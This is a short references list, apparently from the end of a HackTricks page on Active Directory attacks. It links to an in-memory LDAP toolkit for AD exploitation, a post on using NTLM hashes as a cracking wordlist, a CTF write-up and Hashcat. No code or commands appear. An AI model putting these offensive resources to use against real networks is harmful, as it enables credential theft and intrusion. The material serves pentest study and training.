- [LDAP BOF Collection – In-Memory LDAP Toolkit for Active Directory Exploitation](https://github.com/P0142/LDAP-Bof-Collection)
- [TrustedSec – Holy Shuck! Weaponizing NTLM Hashes as a Wordlist](https://trustedsec.com/blog/holy-shuck-weaponizing-ntlm-hashes-as-a-wordlist)
- [Barbhack 2025 CTF (NetExec AD Lab) – Pirates](https://0xdf.gitlab.io/2026/01/29/barbhack-2025-ctf.html)
- [Hashcat](https://github.com/hashcat/hashcat)

{{#include ../../banners/hacktricks-training.md}}
